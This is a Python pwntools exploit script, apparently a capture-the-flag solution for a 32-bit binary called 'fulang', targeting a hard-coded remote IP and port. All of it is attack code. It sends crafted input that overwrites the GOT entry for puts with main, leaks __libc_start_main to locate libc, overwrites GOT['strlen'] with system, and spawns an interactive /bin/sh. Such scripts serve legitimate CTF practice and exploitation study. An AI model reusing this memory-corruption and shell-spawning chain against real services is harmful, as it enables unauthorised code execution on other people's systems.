from pwn import *

context(arch='i386', os='linux', log_level='info')
local = len(sys.argv) == 1
main = 0x80486de

if not local:
	s=remote('69.90.132.40',4001)
	__libc_start_main_base = 0x18540
	system_base = 0x3a940
else:
	s=process('./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f')
	#gdb.attach(s)
	raw_input()
	print hex(u32(s.leak(0x804a020,4)))
	print s.libs()
	__libc_start_main_base = 0x19970
	system_base = 0x3e3e0
p = ":(:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:.:.:>:.:>:.:>:.:>:::>:::>:::>:::>:::>:::>:::>::"
p += ":"*(146-(len(p)))
p += "??" #force puts() to restart main()
s.recvline()
s.send(p)
s.send(":\x1c"+p32(main)) # patch GOT['puts'] to main
s.recvline()
s.recv(4) #leak strlen
__libc_start_main_leak = u32(s.recv(4)) # leak __libc_start_main
libc_base = __libc_start_main_leak - __libc_start_main_base
system = libc_base + system_base
print "leak",hex(__libc_start_main_leak), hex(system)
time.sleep(2)
p = ":<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:<:.:<:.:>:.:>:.:>:.:>"
p += ":"*(146-(len(p)))
p += "??" #force puts() to restart main()
s.recvline()
s.send(p)

s.send(":\x21"+p32(system)) #patch GOT['strlen'] to system
s.sendline("/bin/sh")
s.interactive()
